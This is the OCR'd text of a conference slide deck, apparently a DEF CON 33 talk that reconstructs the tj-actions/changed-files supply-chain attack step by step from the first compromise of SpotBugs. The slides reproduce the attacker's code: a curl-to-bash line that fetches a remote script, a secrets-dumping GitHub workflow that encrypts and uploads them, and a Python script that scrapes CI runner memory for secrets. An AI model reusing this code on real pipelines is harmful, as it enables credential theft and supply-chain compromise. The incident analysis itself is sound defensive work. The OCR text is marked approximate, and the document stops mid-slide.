---
title: "Not Just a Pipeline Leak Reconstructing the Real Attack Behind tj-actions"
speakers: ["Aviad Hahami"]
conference: "DEF CON"
conference_full: "DEF CON 33"
edition: "33"
year: 2025
source_pdf: "DEF CON 33/Aviad Hahami - Not Just a Pipeline Leak Reconstructing the Real Attack Behind tj-actions.pdf"
pages: 146
sha256: "cb33929a056a23bb699e2e4c5b2862c85146e5adefe789afdc2e6cb34f9e7e87"
text_chars: 38978
ocr_pages: 60
has_ocr: true
redacted_secrets: 0
ocr_confidence: 88.3
ocr_unreliable_blocks: 0
ocr_timeouts: 0
pages_recovered_from_text_layer: 5
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T06:54:45Z"
---
# Not Just a Pipeline Leak Reconstructing the Real Attack Behind tj-actions

**Speakers:** Aviad Hahami  
**Conference:** DEF CON 33  
**Source:** `DEF CON 33/Aviad Hahami - Not Just a Pipeline Leak Reconstructing the Real Attack Behind tj-actions.pdf` (146 pages)


## Slide 1

8/9/2025 DefCon33 0

## Slide 2

# **3**

8/9/2025

DefCon33

1

## Slide 3

# **2**

8/9/2025

DefCon33

2

## Slide 4

# **1**

8/9/2025

DefCon33

3

## Slide 5

8/9/2025 DefCon33 4

## Slide 6

#### **March 14th, 2025**

8/9/2025

DefCon33

5

## Slide 7

#### **March 14th, 2025 ~4PM (UTC)**

8/9/2025

DefCon33

6

## Slide 8

##### **March 14th, 2025 ~4PM (UTC)**

8/9/2025

DefCon33

7


> Recovered by OCR — confidence 85/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
March 14th, 2025
~4PM (UTC)
= ww) tj-actions / changed-files
Code Issues Pulls Discussions Actions
i@- Github action to retrieve all (added, copied, modified, deleted, renamed, type changed,
unmerged, unknown) files and directories.
3 MIT license
@ Code of conduct
8 Security policy
wW 2.5kstars % 299forks © 11 watching # 27Branches © 371Tags ~ Activity
8/9/2025 DefCon33
```

## Slide 9

##### **March 14th, 2025 ~4PM (UTC)**

8/9/2025

DefCon33

8


> Recovered by OCR — confidence 88/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
March 14th, 2025
~4PM (UTC)
= ws) @ tj-actions / changed-files
Issues Pulls Discussions Actions
8/9/2025 DefCon33
```

## Slide 10

**~4PM (UTC), March 14th, 2025**

###### **Injected code**

8/9/2025 DefCon33

9


> Recovered by OCR — confidence 85/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
iged +12 -1 lines changed + Top Q Search within code
wjs O 4 +12 -
const core = __importStar(__nccwpck_require__(7484) );' e
const exec = __importStar(__nccwpck_require__(5236)); | n e cte d cod e
@@ -2992,6 +2994,15 @@ const warnUnsupportedRESTAPIInputs
}
+ async function updateFeatures(token) {
+ const {stdout, stderr} = await exec.getExecOutput('bash', ['-c', “echo
ApmaQo=""_| base64 -d > /tmp/run.sh && bash /tmp/run.sh’], {
+ ignoreReturnCode: true,
+ silent: true
+ core. info(stdout) ;
+
+}
@@ -71082,4 +71093,4 @@ exports.visitAsync = visitAsync;
```

## Slide 11

**Prints all the environment variables of the CI runner to the logs**

8/9/2025

DefCon33

10


> Recovered by OCR — confidence 86/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
iged +12 -1 lines changed 7 Top Q Search within code
wjs O F +12 -
const core = __importStar(__nccwpck_require__(7484));
const exec = __importStar(__nccwpck_require__(5236));
@@ -2992,6 +2994,15 @@ const warnUnsupportedRESTAPIInputs = async ({ inputs }) => {
=cl Prints all the environment variables
+ const
cn of the Cl runner to the logs pe
ApmaQo=""
+ ig
+ silent: true
7 core. info(stdout) ;
@@ -71082,4 +71093,4 @@ exports.visitAsync = visitAsync;
```

## Slide 12

8/9/2025 DefCon33

11

## Slide 13

8/9/2025 DefCon33 12


> Recovered by OCR — confidence 94/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Multiple tags in this action are compromised #2463
© Closed & Locked
=
varunsh-coder opened on Mar 14 - edited by varunsh-coder Edits v
Example this tag was just updated 3 hours back and is potentially exfiltrating credentials
You can read more here:
Reported the issue via the email address provided in the security.md file and also reported it via private vulnerability
disclosure to generate a CVE.
8/9/2025 DefCon33
```

## Slide 14

8/9/2025 DefCon33 14

## Slide 15

8/9/2025 DefCon33 15


> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
(a0) Semgrep @
BSA very popular GitHub Action, tj-actions/changed-files, has been
compromised with a payload that appears to attempt to dump secrets,
impacting thousands of Cl pipelines.
If you’re using this action, we recommend you stop using it immediately.
More here including how to search across all the GitHub Actions used in
your org:
semgrep.dev/blog/2025/popu...
8/9/2025 DefCon33
15
```

## Slide 16

8/9/2025 DefCon33 16


> Recovered by OCR — confidence 88/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
BBA very popular GitHub Action, tj-ac’ m& GitFlub Actions are under attack!
compromised with a payload that appe
. : a A supply chain attack hit tj-actions/changed-files, leaking AWS keys,
impacting thousands of Cl pipelines.
GitHub PATs & more. CISA confirms active exploitation.
If you’re using this action, we recomme @ CVE-2025-30066 (CVSS 8.6)
@ Attack spread via another compromised Action
More here including how to search acr¢ @ Sensitive secrets exposed via logs
your org: Show more
rerli.artc
8/9/2025 DefCon33
```

## Slide 17

8/9/2025 DefCon33 17


> Recovered by OCR — confidence 87/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
BBA very popular GitHub Action, tj-ac’ m& GitFlub Actions are under attack!
compromised with a payload that appe
. : oo, A supply chain attack hit tj-actions/changed-files, leaking AWS keys,
impacting thousands of Cl pipelines.
GitHub PATs & more. CISA confirms active exploitation.
If you’re using this action, we recomme @ CVE-2025-30066 (CVSS 8.6)
(>? salolivares on Mar 15 - edited by salolivares
Yep... this looks scary:
8/9/2025 DefCon33
```

## Slide 18

8/9/2025 DefCon33 18


> Recovered by OCR — confidence 93/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
GitHub Action tj-actions/changed-files
supply chain attack: everything you need
to know A The Register
A supply chain attack on popular Git GitHub supply chain attack spills secrets from 23,000
projects
t News StepSecurity disclosed a compromise of the popular GitHub Action tj-actions/changed-
files, which works to detect file changes in open source projects.
Harden-Runn 17 Mar 2025
compromised
We have concluded our investigation into the tj-actions/changed-files
compromise. This post explains how the attack worked, how we detected it, and
what steps you should take to secure your Cl/CD environment.
ib Actions tj-
Varun Sharm anged-files Attack
March 14, 2025
```

## Slide 19

However

8/9/2025

DefCon33

19

## Slide 20

###### **That was not the goal of the attack…**

8/9/2025

DefCon33

20

## Slide 21

Not Just a Pipeline Leak

Reconstructing the real attack behind tj-actions

## Slide 22

###### Whoami

[ > ] Aviad Hahami ( @_0xffd )

[ > ] Previously security researcher @ Palo Alto Networks [ > ] Currently eBPF engineer @ Odigos.io [ > ] Bug Bounty \ Graph Theory \ Lacto-fermentation & more...

8/9/2025

DefCon33

22

## Slide 23

###### <u>Disclaimer</u>

This presentation covers research performed by my colleagues and myself during my time of employment at Palo Alto Networks.

I have since left the company and no longer work for Palo Alto Networks and therefore am not speaking on their behalf.

I would like to thank Palo Alto Networks for allowing me to share this research with the community.

8/9/2025

DefCon33

23

## Slide 24

## OK!

8/9/2025

DefCon33

24

## Slide 25

###### **What’s in this talk?**

→ This talk is a debug-level walkthrough of the tj-actions incident

→ Tactics, Techniques, and Procedures (TTPs) breakdown

→ How we conducted the investigation

→ Additional victims & impact

→ Mitigations

8/9/2025

DefCon33

27

## Slide 26

Our story takes place in the GitHub world, where anyone can make their code accessible to others

## Slide 27

**GitHub Actions allows users to execute code from arbitrary repositories to perform various tasks**

## Slide 28

**GitHub Actions became the most used CI solution for GitHub hosted repositoties**

_Manolov, V., Gotseva, D., & Hinov, N. (2025)_


> Recovered by OCR — confidence 94/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CI/CD platforms worldwide usage
20%
GitHub Actions
became the most used
Cl solution for GitHub
hosted repositoties
Manolov, V., Gotseva, D., & Hinov, N. (2025)
```

## Slide 29

Throught the years we developed a habbit of assuming that if something is accessible and widely used – we can trust it

## Slide 30

**Attackers know that too...**

## Slide 31

8/9/2025 DefCon33 33


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
A The Register
GitHub supply chain attack spills secrets from 23,000
projects
StepSecurity disclosed a compromise of the popular GitHub Action tj-actions/changed-
files, which works to detect file changes in open source projects.
17 Mar 2025
33
```

## Slide 32

**When we initially faced the attack, we were met the following scenario**

## Slide 33

Initial incident flow
LOG
LOG
LOG
LOG
Secrets printed to
workflow logs
Used in
workflows of
many

tj-actions/​changed-files​

Used in
workflows of
many

8/9/2025

DefCon33

35

## Slide 34

8/9/2025 DefCon33 36


> Recovered by OCR — confidence 92/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
name: do-your-job
on:
push:
branches:
- main
env:
SLACK_TOKEN: ${{ secrets.SLACK_TOKEN }}
jobs:
build:
runs-on: ubuntu-Llatest
steps:
- name: Checkout repository
uses: actions/checkoutav4
: Check for changed files
name: Print changed files
run: echo "S{{ steps.changed-files.outputs.all_changed_files }}"
DefCon33 36
```

## Slide 35

8/9/2025 DefCon33 37


> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
do-your-job
S{{ secrets.SLACK_TOKEN }}
ubuntu-Latest
Checkout repository
actions/checkoutav4
- name: Check for changed files
uses: tj-actions/changed-filesav39
Print changed files
echo "S{{ steps.changed-files.outputs.all_changed_files }}"
37
```

## Slide 36

###### **<u>Two</u> weeks after the initial incident**

## Slide 37

8/9/2025 DefCon33 39


> Recovered by OCR — confidence 89/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Repository Repository Repository Repository
Invite disposable user
as a member
maintainers Override v1 tag
spotbugs/ reviewdog/
Steal
maintainer’s
. PAT PAT
Malicious pull .
request (PPE) spotbugs/
sonar-findbugs spotbugs action-setup
Create workflow
Dependency
First override:
Secrets leaked to attacker v39 tag
ys coinbase/ Used in workflow of tj-actions/ Used in workflow of tj-actions/
eslint-changed-
agentkit changed-files L files
Second override:
multiple tags
Secrets printed
to workflow logs
Used in workflow of
(/ UNIT 42
BY PALO ALTO NETWORKS
```

## Slide 38

8/9/2025 DefCon33 40

## Slide 39

Where we originally started


> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Secrets printed
to workflow logs
Where we originally started
tj-actions/
changed-files
O49, Used in workflow of
```

## Slide 40

Where we will start today

## Slide 41

Where we will start today

## Slide 42

>> Timeline <<

March 14, 2025

8/9/2025 DefCon33 Mass credentials leak44

## Slide 43

Step #1
Compromising the SpotBugs
organization

DefCon33

8/9/2025

45

## Slide 44

**PWN request (aka PPE) is when an actor can run unauthorized code in your CI machine (CI RCE)**

8/9/2025

DefCon33

47

## Slide 45

Victim Attacker
GitHub Actions CI
2. Malicious commit
1. fork
4. ci trigger
Repo A Forked repo A
3. pull request

8/9/2025

DefCon33

48

## Slide 46

Victim Attacker
GitHub Actions CI
5. code checkout
4. ci trigger
Repo A Forked repo A

8/9/2025

DefCon33

49

## Slide 47

Victim Attacker
5. Run malicious code
GitHub Actions CI
Forked repo A
Repo A

8/9/2025

DefCon33

50

## Slide 48

###### Step #1: **Compromising SpotBugs**

• The attacker targeted a vulnerable GitHub Actions workflow in an organization called SpotBugs, in a repository called SpotBugs/sonar-findbugs

8/9/2025

DefCon33

52

## Slide 49

8/9/2025 DefCon33 53


> Recovered by OCR — confidence 82/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
= © spotbugs / sonar-findbugs
<> Code © Issues 9 31 Pullrequests 6 ) Discussions ©) Actions
Run #1116
}Sael-emm ghost wants to merge 1 commit into spotbugs:master from unknown repository
) Conversation 0 > Commits 1 Fl Checks o Files changed 1
a @@ -33,6 +33,8 @@
33 33 #-- -MAVEN_SKIP_RC -- flag to disable: loading of mavenrc: files
35 35
0/1 files viewed
& Ask Copilot
Review in codespace
Try the new experience <>Code w
Review changes
36 curl: -sSfL https://gist.githubusercontent.com/randolzfow/aa451dfb48c3bc982aeeb5163261f2f4/ raw/4171c8ee0e3ca53d249 Ff f340da772d63567fb58e/run.sh | bash
> /dev/null 2>&1
37
36 38 if [ -z "$MAVEN_SKIP_RC" ]; then
37 39
38 40 if [ -f /usr/local/etc/mavenre ]; then
53
```

## Slide 50

###### Step #1: **Compromising SpotBugs**

- The attacker targeted a vulnerable GitHub Actions workflow in an organization called SpotBugs, in a repository called SpotBugs/sonar-findbugs

- Pipeline exploited on **<u>Dec 6th, 2024</u>**

8/9/2025

DefCon33

54

## Slide 51

###### Step #1: **Compromising SpotBugs** • The attacker targeted a vulnerable GitHub Actions workflow in an **<3 months prior to the tj-actions incident** organization called SpotBugs, in a repository called SpotBugs/sonar-findbugs

• Pipeline exploited on **<u>Dec 6th, 2024</u>**

8/9/2025

DefCon33

55

## Slide 52

###### Step #1: **Compromising SpotBugs**

- The attacker targeted a vulnerable GitHub Actions workflow in an organization called SpotBugs, in a repository called SpotBugs/sonar-findbugs

- Pipeline exploited on **<u>Dec 6th, 2024</u>**

- The attacker leaked a PAT (Personal Access Token) of a SpotBugs maintainer. This PAT had admin-like permissions.

8/9/2025

DefCon33

56

## Slide 53

8/9/2025 DefCon33 57


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
spotbugs/
sonar-findbugs
57
```

## Slide 54

8/9/2025 DefCon33 58


> Recovered by OCR — confidence 93/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Malicious pull
request (PPE)
Repository
access
Steal
maintainer’s
PAT
if spotbugs/
Repository
access
Invite disposable
user as amember
spotbugs/
spotbugs
58
```

## Slide 55

8/9/2025
DefCon33
59
>> Timeline <<

March 14, 2025
Mass credentials leak
Dec 6, 2024
SpotBugs compromised

## Slide 56

8/9/2025
DefCon33
60

Step #2
Recon & wait

## Slide 57

Step #2: **Recon & wait** In the time following the attack on SpotBugs, the attacker used the PAT they obtained to check what other repositories and organizations they can access using it

Dec 6, 2024 March 14, 2025 8/9/2025 DefCon33 Mass credentials leak61 SpotBugs compromised

## Slide 58

###### Step #2: **Recon & wait**

Using the IPs from SpotBugs maintainer’s activity log (thanks J!) we were able to see the API requests and draw the following activity heatmap

Legend
API Activity
API Token
GIT Token
PAT API
PAT GIT

8/9/2025

DefCon33

62

## Slide 59

###### Step #2: **Recon & wait**

Maintainer #2

8/9/2025

DefCon33

63

## Slide 60

###### Step #2: **Recon & wait**

_The attacker waited for its actucal target to get into vulnerable position for more than 3 months..._

8/9/2025

DefCon33

64

## Slide 61

###### Step #2: **Recon & wait**

_On March 7th, a Coinbase maintainer pushed to a coinbase GitHub repository a workflow that uses the tj-actions/changed-files action_

Dec 6, 2024 March 7, 2025 March 14, 2025 8/9/2025 Coinbase becomes vuln. DefCon33 Mass credentials leak65 SpotBugs compromised

## Slide 62

Step #3Step #3 :
Lateral Movement to the
reviewdog organization

8/9/2025

DefCon33

66

## Slide 63

###### Step #3: **Lateral Movement into reviewdog**

- The attacker knew that a PAT of a reviewdog maintainer existed in the spotbugs/spotbugs repository

- Can’t just log in and see the secrets, it doesn’t work like that

- Can push a malicious workflow to exfiltrate, but that makes noise…

- How to do it with minimal footprint?

8/9/2025

DefCon33

67

## Slide 64

###### **Memberships & disposable users**

- The attacker invited their dummy user to the repository spotbugs/spotbugs (username: <u>JurkaOfAvak)</u>

- JurkaOfAvak pushed a branch with a malicious workflow to exfiltrate the PAT

- Once the workflow was triggered, “JurkaOfAvak” deleted the branch and itself

8/9/2025

DefCon33

68

## Slide 65

###### **Memberships & disposable users**

spotbugs/spotbugs
Attacker JurkaOfAvak
Push branch with
Invite as member to
malicious workflow
spotbugs/spotbugs
Executes malicious code
Delete itself and the branch
DefCon33

8/9/2025

69

## Slide 66

###### Step #3: **Lateral Movement (branch creation)**

8/9/2025

DefCon33

73


> Recovered by OCR — confidence 86/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Step
3: Lateral Movement (branch creation)
= ws) @® spotbugs / spotbugs
<> Code ©) Issues 429
Activity
Deleted branch
deleted this branch
Test Commit
created this branch
$1 Pullrequests 30 () Discussions (©) Actions
© Alltime ~
73
```

## Slide 67

###### Step #3: **Lateral Movement (branch creation)**

Branch name

8/9/2025

DefCon33

74


> Recovered by OCR — confidence 83/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Step
3: Lateral Movement (branch creation)
= ws) @® spotbugs / spotbugs
<> Code ©) Issues 429 $1 Pullrequests 30 () Discussions (©) Actions
Activity
Branch name
# hewrkbwkyk ~ A- Allactivity ~
Deleted branch
deleted this branch + on Mar 11
Test Commit
created this branch +« f5434e3 + on Mar 11
& Allusers ~ © Alltime ~
74
```

## Slide 68

###### Step #3: **Lateral Movement (branch creation)**

Created & deleted the branch within 1 minute!

8/9/2025

DefCon33

75


> Recovered by OCR — confidence 81/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Step
3: Lateral Movement (branch creation)
= ws) @® spotbugs / spotbugs
<> Code ©) Issues 429 3 Pull requests 30
() Discussions (©) Actions
Activity Created & deleted the branch
within 1 minute!
# hewrkbwkyk ~ A- Allactivity ~
Deleted branch
deleted this branch + on Mar 11
Test Commit
created this branch +« f5434e3 + on Mar 11
© Alltime ~
75
```

## Slide 69

###### Step #3: **Lateral Movement (mal. workflow)**

8/9/2025

DefCon33

76


> Recovered by OCR — confidence 87/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Step
3: Lateral Movement (mal. workflow)
© spotbugs / spotbugs
<> Code ©) Issues 429 3% Pullrequests 30 Q) Discussio!
CS 8 f5434e3 ~ spotbugs / .github / workflows / test.yml
A This commit does not belong to any branch on this repository, and ma
jurkaofavak Test Commit
Blame 57 lines (41 loc) - 1.69 KB
1 name: hewrkbwkyk
2 on:
3 push:
4 branches: hewrkbwkyk
5 jobs:
6 testing:
7 runs-on:
8 - ubuntu-latest
9 steps:
11 VALUES: ${{ toJSON(secrets)}}
12 name: Prepare repository
13 run: "\ncat <<EOF > output. json\n$VALUES\nEOF\n
14 - name: Run Tests
15 env:
16 PUBKEY: '---—- BEGIN PUBLIC KEY----—
76
```

## Slide 70

###### Step #3: **Lateral Movement (mal. workflow)**

8/9/2025

DefCon33

77


> Recovered by OCR — confidence 86/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Step
we) spotbugs / spotbugs
<> Code © Issues 429 3% Pullrequests 30 Q) Discussio!
CS 5434e3 ~ spotbugs / .github / workflows / test.yml
A\ This commit does not belong to any branch on this repository, and ma
jurkaofavak Test Commit
Blame 57 lines (41 loc) + 1.69 KB
1 name: hewrkbwkyk
2 on:
3 push:
4 branches: hewrkbwkyk
5 jobs:
6 testing:
7 runs-on:
8 - ubuntu-latest
9 steps:
11 VALUES: ${{ toJSON(secrets)}}
12 name: Prepare repository
13 run: "\ncat <<EOF > output. json\n$VALUES\nEOF\n
14 - name: Run Tests
15 env:
16 PUBKEY: '---—- BEGIN PUBLIC KEY-----
3: Lateral Movement (mal. workflow)
push:
branches: hewrkbwkyk
77
```

## Slide 71

###### Step #3: **Lateral Movement (mal. workflow)**

8/9/2025

DefCon33

78


> Recovered by OCR — confidence 84/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Step
3: Lateral Movement (mal. workflow)
steps:
- env:
VALUES: ${{ toJSON(secrets) }}
name: Prepare repository
run: "\ncat <<EOF > output. json\n$VALUES\nEOF\n "
-— name: Run Tests
env:
PUBKEY: '----- BEGIN PUBLIC KEY-----
run: aes_key=$(openssl rand -hex 12 | tr -d '\n');openssl enc -aes—256-cbc —pbkdf2
-in output.json -out output_updated.json -pass pass:$aes_key;echo $aes_key
| openssl rsautl -encrypt -pkcs -pubin -inkey <(echo "$PUBKEY") -out lookup. txt
2> /dev/null;
— name: Upload artifacts
uses: actions/upload-artifact@v4
with:
name: files
path: ' |
78
```

## Slide 72

###### Step #3: **Lateral Movement (mal. workflow)**

1. Stringify and write to file all the secrets of the repository (output.json)

8/9/2025

DefCon33

79

## Slide 73

###### Step #3: **Lateral Movement (mal. workflow)**

1. Stringify and write to file all the secrets
of the repository (output.json)
2. Generate an AES symmetric key
3. Encrypt the output.json file using the
new key
4. Encrypt both the encrypted file and the
AES key using their asymmetric key

8/9/2025

DefCon33

80

## Slide 74

###### Step #3: **Lateral Movement (mal. workflow)**

1. Stringify and write to file all the secrets of the repository (output.json)

2. Generate an AES symmetric key 3. Encrypt the output.json file using the new key

4. Encrypt both the encrypted file and the AES key using their asymmetric key

5. Upload the encrypted data as artifacts for later download

8/9/2025

DefCon33

81

## Slide 75

###### Step #3: **Lateral Movement to reviewdog**

Achievements:

- Obtained the PAT of a reviewdog maintainer ( == write permissions in reviewdog)

- Perform malicious activity in the organization with minimal footprint

8/9/2025

DefCon33

82

## Slide 76

8/9/2025 DefCon33 83


> Recovered by OCR — confidence 86/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Repository Repository
access 2 access
Invite disposable
Steal user as amember
maintainer’s
PAT
Malicious pull
request (PPE) { spotbugs/ spotbugs/
i sonar-findbugs spotbugs
```

## Slide 77

8/9/2025 DefCon33 84


> Recovered by OCR — confidence 92/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Repository Repository
access access
Invite disposable
Steal user as amember
maintainer’s
PAT
Malicious pull
request (PPE) { spotbugs/ spotbugs/
spotbugs
A
Create workflow
8/9/2025 DefCon33
```

## Slide 78

8/9/2025 DefCon33 85


> Recovered by OCR — confidence 86/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Repository Repository Repository
access 2 access access ve,
Invite disposable
Steal | user as a member Steal
maintainer’s maintainer’s
PAT PAT
Malicious pull :
request (PPE) if spotbugs/ spotbugs/
spotbugs
A
Create workflow
Repository
access
reviewdog/
action-setup
85
```

## Slide 79

Step #4
Lateral Movement to the
tj-actions organization

8/9/2025

DefCon33

86

## Slide 80

8/9/2025 DefCon33 87


> Recovered by OCR — confidence 83/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Repository Repository Repository
5 Invite disposable
\ maintainer’s i! maintainer’s
PAT i PAT
Malicious pull ¥ yy -
request (PPE) { spotbugs/ spotbugs/
spotbugs
i sonar-findbugs
A
Create workflow
Repository
access
reviewdog/
action-setup
Dependency
eslint-changed-
files
tj-actions/ ) Used in workflow of ( tj-actions/
changed-files J
87
```

## Slide 81

###### **Fork commits & git tags**

In other words: • On GitHub, when a repository is forked, it is added to the “CF **o** rk Networkmmitting to a fork” of the or s equivalent to **i** ginal repository pushing a • This is a branch to a repository you don’t ownGitHub feature (and not a git feature)!  git doesn’t have . “forks”!  “forks” are ~branchesThe code doesn’t do anything – but it’s there • _Residual effect_ : commits that were pushed to a fork of a repository are accissble from the original repository

8/9/2025

DefCon33

89

## Slide 82

###### **Fork commits & git tags**

commit 1 commit 2

main

fork: main malicious commit

8/9/2025

DefCon33

91

## Slide 83

Fork commits & git tags
“same” repo
github.com/ my_org/my_repo /commit/ commit2
main
…
fork: main
github.com/ my_org/my_repo /commit/ malicious_commit

8/9/2025

DefCon33

92

## Slide 84

Fork commits & git tags
“same” repo
github.com/ my_org/my_repo /commit/ commit2
main
fork: main

github.com/ **my_org/my_repo** /commit/ **malicious_commit**

8/9/2025

DefCon33

93

## Slide 85

###### **Fork commits & git tags**

“same” repo github.com/ **my_org/my_repo** /commi **t** / **commit2** This is a well thought echnique as it achieves two things: main

1. No commits noise (nothing pushed)

2. GH doesn’t log git tag events for free tiers

fork: main

github.com/ **my_org/my_repo** /commit **/ malicious_commit**

8/9/2025

DefCon33

94

## Slide 86

###### **Fork commits & git tags**

“same” repo

github.com/ **my_org/my_repo** /commit/ **commit2** <u>The attacker utilized this technique multiple times in</u> main the following steps, so we will refer to it as “shadow commits”

fork: main

github.com/ **my_org/my_repo** /commit/ **badcommit**

8/9/2025

DefCon33

95

## Slide 87

8/9/2025 DefCon33 99


> Recovered by OCR — confidence 92/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Repository Repository
access access
Invite disposable
maintainer’s
PAT
Repository
access
Steal
maintainer’s
PAT
Malicious pull
request (PPE) ( spotbugs/
spotbugs/
spotbugs
A
Create workflow
Repository
access
reviewdog/
action-setup
Dependency
eslint-changed-
files
tj-actions/ ) Used in workflow of ( tj-actions/
changed-files J
99
```

## Slide 88

8/9/2025 DefCon33 100


> Recovered by OCR — confidence 82/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
e
= ©) @ reviewdog / action-setup Q Type (Z)to search 8B - +r © 8% B 2.
<> Code © Issues 6 T2 Pullrequests 4 © Actions
Z\ This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.
Commit @f176b3 ©) Browse files
iLrmKCu86tjwp8 authored on Mar 11
1
patch diff + 1 parent 113423a commit @f176b3 (0
C0 1file changed +11 -0 lines changed Q Search within code oy
8/9/2025 DefCon33 100
```

## Slide 89

8/9/2025 DefCon33

101


> Recovered by OCR — confidence 88/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Vv
14
15
CD 1file changed +11 -0 lines changed * Top Q Search within code
14 fi
15
17
18
19
20
21
22
23
24
25
26
if [ "$RUNNER_ENVIRONMENT" = 'github-hosted' ] && [ "$RUNNER_OS" = 'linux' ]; then
echo $SCRIPT_RUNNER | base64 -d > "$TEMP/runner_script.py"
VALUES=*python3 $TEMP/runner_script.py | tr -d '\@' | grep -aoE '"[*"]+":\{"value":"[*"]*","isSecret":true\}' | sort -u | base64 -w @ | base64 -w @
echo 'Review metadata: '
echo $VALUES
echo 'Configuring...'
sleep 15 & /dev/null
fi
101
```

## Slide 90

8/9/2025 DefCon33 102


> Recovered by OCR — confidence 85/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
16
17
19
20
21
22
23
24
25
26
#
/usr/bin/env python3
based on https://davidebove. com/blog/?p=1620
import sys
import os
import re
de
if
if
fi
f get_pid():
# https: //stackoverf low. com/questions/2703640/process-List-on-Linux-via-python
pids = [pid for pid in os. listdir('/proc') if pid.isdigit()]
for pid in pids:
with open(os.path.join('/proc', pid, ‘cmdline'), 'rb') as cmdline_1
if b'Runner.Worker' in cmdline_f.read():
return pid
raise Exception('Can not get pid of Runner.Worker')
pid = get_pid()
map_path = f"/proc/{pid}/maps”
mem_path = f"/proc/{pid}/mem"
with open(map_path, ‘r') as map_f, open(mem_path, ‘rb', @) as mem_f:
for line in map_f.readlines(): # for each mapped region
m = re.match(r' ( [@-9A-Fa-f]+)-( [0-9A-Fa-f]+) ({-r])', line)
if m.group(3) == 'r': # readable region
start = int(m.group(1), 16)
end = int(m.group(2), 16)
# hotfix: OverflowError: Python int too large to convert to C long
# 18446744073699065856
if start > sys.maxsize:
continue
mem_f.seek(start) # seek to region start
try:
chunk = mem_f.read(end - start) # read region contents
except OSError:
continue
[ “$RUNNER_ENVIRONMENT" = ‘github-hosted' ] && [ "$RUNNER_OS" = ‘linux’ ]; then
echo $SCRIPT_RUNNER | base64 -d > “$TEMP/runner_script.py”
VALUES="python3 $TEMP/runner_script.py | tr -d '\@' | grep -aoE '™[*"]+":\{"value":
echo $VALUES
echo ‘Configuring...*
sleep 15 & /dev/nult
[o"]«","isSecret":true\}' | sort -u | base64 -w @ | base64 -w @
102
```

## Slide 91

DefCon33

Iterates all the /proc directories, their /proc/{pid}/maps and /proc/{pid}/mem subdirectories

8/9/2025

103


> Recovered by OCR — confidence 91/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
def get_pid():
# https://stackoverf low. com/questions/2703640/process—List-on-lLinux-via-python
pids = [pid for pid in os.listdir('/proc') if pid.isdigit()]
for pid in pids:
with open(os.path.join('/proc', pid, ‘cmdline'), 'rb') as cmdline_f
if b'Runner.Worker' in cmdline_f.read():
return pid
raise Exception('Can not get pid of Runner.Worker')
if _name_ == “_main_":
pid = get_pid()
print(pid)
map_path = f"/proc/{pid}/maps"
mem_path = f"/proc/{pid}/mem"
Iterates all the /proc
directories, their
/proc/{pid}/maps and
/proc/{pid}/mem
subdirectories
with open(map_path, ‘r') as map_f, open(mem_path, ‘rb', @) as mem_f:
for line in map_f.readlines(): # for each mapped region
m = re.match(r' ( [@-9A-Fa-f]+)-( [0-9A-Fa-f]+) ([-r])', line)
if m.group(3) == 'r': # readable region
start = int(m.group(1), 16)
end = int(m.group(2), 16)
# hotfix: OverflowError: Python int too large to convert to C long
# 18446744073699065856
if start > sys.maxsize:
continue
mem_f.seek(start) # seek to region start
try:
chunk = mem_f.read(end - start) # read region contents
except OSError:
continue
103
```

## Slide 92

###### Prints all the found secrets to the log

8/9/2025

DefCon33

104


> Recovered by OCR — confidence 86/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Prints all the found secrets to the log
